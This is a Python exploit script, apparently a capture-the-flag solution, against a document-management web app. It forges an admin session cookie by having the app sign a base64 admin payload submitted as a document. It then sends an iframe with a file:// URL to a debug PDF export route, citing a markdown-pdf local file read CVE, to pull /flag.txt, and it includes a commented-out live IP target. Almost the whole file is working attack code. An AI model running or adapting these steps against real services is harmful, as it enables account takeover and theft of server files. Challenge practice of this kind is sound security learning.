#!/usr/bin/env python3

import requests
import base64
import re
import time


def main():
	# The creator used the same function to generate the signature of the document,
	# for generating the hashed part of the cookie. So we can simply create a cookie
	# for the admin user by using the "Create New Document" functionality and pass the
	# b64 cookie we want to forge.

	URL = "http://localhost:1337"
	# URL = "http://154.57.164.65:30433"
	payload = '{"username":"admin","id":1}'

	# Note: btoa() in JS uses Latin1/UTF-8; base64 in python matches this.
	b64_admin = base64.b64encode(payload.encode()).decode()
	print(f"[*] Base64 Payload: {b64_admin}")

	session = requests.Session()

	print("[*] Registering temporary user...")
	session.post(f"{URL}/register", data={"username": "vego", "password": "vego"})
	session.post(f"{URL}/login", data={"username": "vego", "password": "vego"})

	print("[*] Submitting payload as document to leak signature...")
	session.post(f"{URL}/documents", data={"content": b64_admin})

	# Retrieve the integrity hash (the signature) from the documents list
	response = session.get(f"{URL}/documents")
	signatures = re.findall(r'[a-f0-9]{64}', response.text)

	if signatures:
	    leaked_sig = signatures[-1]
	    print(f"[+] Leaked Signature: {leaked_sig}")

	    admin_cookie = f"{b64_admin}-{leaked_sig}"
	    print(f"\n[!] ADMIN COOKIE FORGED: {admin_cookie}")
	else:
	    print("[-] Failed to retrieve signature.")


	# From the packages file, the markdown-pdf package, of version 11.0.0, has a known public exploit CVE-2023–0835.
	# "markdown-pdf" version 11.0.0 allows an external attacker to remotely obtain arbitrary local files.
	# This is possible because the application does not validate the Markdown content entered by the user.
	target = "/flag.txt"
	guess = "1337"

	# The payload to read the file if we get in. We use a simple <iframe> which is standard for this CVE
	payload = f'<iframe src="file://{target}" width="100%" height="800px"></iframe>'

	headers = {
	    "Cookie": f"user={admin_cookie}"
	}

	data = {
	    "access_pass": guess,
	    "content": payload
	}

	print(f"[*] Starting brute-force attack...")
	print(f"[*] Targeting {target} using guess: {guess}")

	attempts = 0
	while True:
	    attempts += 1
	    try:
	        # We hit the debug export route
	        response = requests.post(f"{URL}/document/debug/export", data=data, headers=headers)
	        
	        if response.status_code == 200:
	            print(f"\n[+] SUCCESS! Match found on attempt {attempts}!")
	            filename = f"leaked_{int(time.time())}.pdf"
	            with open(filename, "wb") as f:
	                f.write(response.content)
	            print(f"[+] PDF saved to {filename}")
	            break
	            
	        elif response.status_code == 403:
	            if attempts % 100 == 0:
	                print(f"[*] Attempts: {attempts}...", end="\r")
	        
	        else:
	            print(f"\n[-] Unexpected status code: {response.status_code}")
	            break

	    except Exception as e:
	        print(f"\n[!] Error: {e}")
	        break



if __name__ == "__main__":
    main()
